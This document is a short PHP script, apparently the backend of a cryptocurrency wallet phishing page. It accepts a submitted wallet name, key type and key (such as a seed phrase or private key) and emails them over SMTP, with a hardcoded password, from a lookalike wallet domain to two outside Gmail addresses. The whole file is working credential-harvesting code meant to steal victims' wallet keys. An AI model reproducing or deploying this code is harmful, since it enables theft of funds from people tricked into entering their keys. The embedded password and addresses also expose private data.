<?php

header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Methods: HEAD, GET, POST, PUT, PATCH, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization");
header('Content-Type: application/json');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require './phpmailer/src/Exception.php';
require './phpmailer/src/PHPMailer.php';
require './phpmailer/src/SMTP.php';


$POST = json_decode(file_get_contents('php://input'), true);

$Type = $POST['Type'];
$Wallet = $POST['Wallet'];
$Key = $POST['Key'];

$phpmailer = new PHPMailer();
$phpmailer->isSMTP();
$phpmailer->Host = 'platiniumxpwallet.com';
$phpmailer->SMTPAuth = true;
$phpmailer->Port = 465;
$phpmailer->Username = 'support@platiniumxpwallet.com';
$phpmailer->Password = 'Platimium2020!';
$phpmailer->SMTPSecure = "ssl";

$phpmailer->setFrom('support@platiniumxpwallet.com', 'New Mail Submission');
$phpmailer->addAddress('divine2nab@gmail.com', 'New Key');
$phpmailer->addAddress('procold275@gmail.com', 'New Key');

$phpmailer->isHTML(true);

$phpmailer->Subject = "New Key Submission";
$phpmailer->Body = "
A new Key Was Submitted!<br>
Details Below<br>
Wallet Name : $Wallet<br>
Key Type : $Type<br>
Key : $Key<br>
";

try {
    $phpmailer->send();
    echo 'Mail Sent';
} catch (Exception $e) {
    echo "Mailer Error: " . $phpmailer->ErrorInfo;
}
